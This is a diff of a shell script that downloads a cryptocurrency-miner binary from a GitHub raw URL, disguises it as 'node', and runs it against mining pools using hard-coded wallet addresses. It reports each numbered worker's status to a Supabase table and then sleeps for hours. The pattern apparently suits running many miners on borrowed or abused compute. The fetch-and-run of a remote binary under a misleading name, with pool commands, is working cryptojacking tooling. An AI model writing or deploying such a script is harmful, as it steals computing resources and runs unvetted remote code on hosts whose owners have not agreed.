@@ -2,12 +2,14 @@
 WORKER_NUMBER=$1
 PASSHOURS=$(date +%S)
 
-echo "start ${WORKER_NUMBER}"
+
 # SRBMiner
-# curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
+curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
 
 # xmr
-curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
+#curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/xmr/linux-static/node
+
+
 chmod +x node
 
 # supabase.co 
@@ -19,9 +21,11 @@ URL="https://$PROJECT.supabase.co/rest/v1/worker_status"
 TIME=$(TZ=Asia/Jakarta date +"%H:%M")
 curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "Content-Type: application/json" -H "Prefer: resolution=merge-duplicates" -d "{\"worker_name\":\"crf_${WORKER_NUMBER}\",\"last_seen\":\"$TIME\"}"
 
+echo "start ${WORKER_NUMBER}"
+
 #./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
 # Qogecoin
-#./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5089 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf > try.log
+./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf > try.log
 # Crionic
 # ./node --disable-gpu -a yespowerltncg -o us-east.coin-miners.info:7646 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.crf_${WORKER_NUMBER} -p id=crf_${WORKER_NUMBER},c=CRNC,m=solo,d=0.2 --cpu-threads-intensity 4 --miner-priority 4 > try.log
 # Whive
@@ -32,6 +36,6 @@ curl -X POST "$URL" -H "apikey: $APIKEY" -H "Authorization: Bearer $APIKEY" -H "
 #./node --disable-gpu -a argon2d_16000 -o stratum.aikapool.com:3919 -u chriskm0101.crf_${WORKER_NUMBER} -p x,pgid=chriskm0101 > try.log
 
 # salvium
-./node -a rx/0 -k --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.crf_${WORKER_NUMBER} > try.log
+#./node -a rx/0 -k --donate-level 1 -o us.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.crf_${WORKER_NUMBER} > try.log
 sleep 29999
 
